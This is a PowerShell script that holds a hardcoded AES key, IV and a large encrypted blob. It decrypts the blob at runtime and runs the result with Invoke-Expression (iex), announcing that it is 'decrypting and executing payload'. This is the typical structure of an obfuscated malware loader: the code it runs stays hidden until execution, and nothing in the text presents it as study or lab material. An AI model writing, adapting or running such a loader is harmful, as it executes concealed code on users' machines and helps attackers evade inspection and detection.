function Decrypt-AES {
    param(
        [string]$encBase64,
        [byte[]]$key,
        [byte[]]$iv
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Padding = "PKCS7"

    $decryptor = $aes.CreateDecryptor()
    $bytes = [Convert]::FromBase64String($encBase64)
    $ms = New-Object IO.MemoryStream
    $cs = New-Object Security.Cryptography.CryptoStream($ms, $decryptor, 'Write')
    $cs.Write($bytes, 0, $bytes.Length)
    $cs.Close()

    [Text.Encoding]::UTF8.GetString($ms.ToArray())
}

# Encrypted data
$key = [Convert]::FromBase64String("c9gcJp1HaaY3HupE4ApCHd9R+OWK9UufNTGzU8IS3lc=")
$iv = [Convert]::FromBase64String("hK7IP7dww87pN1MqP6TYPg==")
$payload = @"
9QxCBOtwIRNcP4Kf5bNzB08zJxWVu3aiXqFOW+IbnXAdoZqE8oZKelS+kqK4hoUpVQqhu6G+FKdewMbqNs+WyyuorXceTyCoz/Vns+JvrCdmtuv2DJBBfmhD6N7FeDoGLZHdEmEO8hTpinZOrne7v9bQ7zhF4ERCCtnjb9wajnfG6nFC1V7hktSl1ynhn7Dyam55fUTrLFxEs4u4h2ko8ok4iEH9mVrSSB7yNSAGlLNsx6GI475ZRXk6aQDYF6IiUPV9qyBmTX++xrMELr+hYQ42d9xDViYhVNCxYuT4w/if5zzlSispddhNWs2lbWCeRqzR+29eprA7JrGoyCsTfGeRddpPIsGAnCQrWZ1BsHyJgkUTQN/wrK+DBaNop5l5fHKoD7T0styunZElh7YdywPj4YGjVlA81Y8HG5/iY70qv15Co0QQnovrjI8kQ85QB9n6FasZSEOKyedzQFxRZclBmVKpLVfLItVbA1H61YYPaJCTirfQuC2EAiobbW75lgA6lQugjswGUi+BYaresSEdMT5r/Ad72A8WIlUSPKxPLkZT7NMhnAsqKapzPVxYnyqjiv/C++yMskHfQ38DgA/eSXbeMKlZUFJIEv9H+8g/Y6z5m7x6tbaMvOEV9+zf5ml7IUKGYPTpED7C629X+ZsL1/axm4Ii/kRdZDmM8UPr83CFTdMXgAAYdkyR38oqc49FAWMeiebM5JrT5e84uf4OXN1rMR8ao4RTkloIEBMP0Pyyy+2XmDvSmIyU52DwDhSSTM8dEe6vZ30QUHeYE1FtAF9fwQr34qG6v2J1V37/Kzxcg/H5xnlc0pmjzjbcGCOTHevkUG1xQDWWqDQ/vloxyIypcJmF/hqARjRMYrNbd6ZbPeaVUeqkQ9su+SNLjWqvLmWIAv1Irpvyr1xJ4jTlDJVspkONeTuiBzuGHU5VCDQBztakaRvin1Q9YVFwgNQ0RR4TM6k85feKfsB53vJDRjhi9/txys7nFo5c
"@

try {
    Write-Output "[*] Decrypting and executing payload..."
    $script = Decrypt-AES -encBase64 $payload -key $key -iv $iv
    iex $script
} catch {
    Write-Error "[-] Decryption or execution failed."
}
